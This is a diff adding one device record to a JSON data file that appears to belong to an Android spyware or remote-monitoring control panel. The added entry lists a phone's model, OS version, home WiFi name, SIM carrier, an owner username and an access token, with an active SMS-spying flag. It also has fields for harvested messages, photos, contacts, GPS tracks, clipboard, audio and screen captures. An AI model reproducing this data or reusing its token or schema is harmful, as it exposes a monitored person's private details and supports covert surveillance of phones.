@@ -17553,5 +17553,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "aimlock_2d77f77d",
+    "deviceName": "HP-AIM LOCK FF-AB0F",
+    "ownerUsername": "yogzz1",
+    "token": "f17a7e009843a9bed32bb7beb236f11d",
+    "lastSeen": 1777006898347,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-24T05:01:38.347Z",
+    "deviceInfo": {
+      "model": "vivo V2440",
+      "androidVersion": "Android 15",
+      "battery": 97,
+      "network": "WiFi: M Mirzha",
+      "sim1": "TELKOMSEL",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
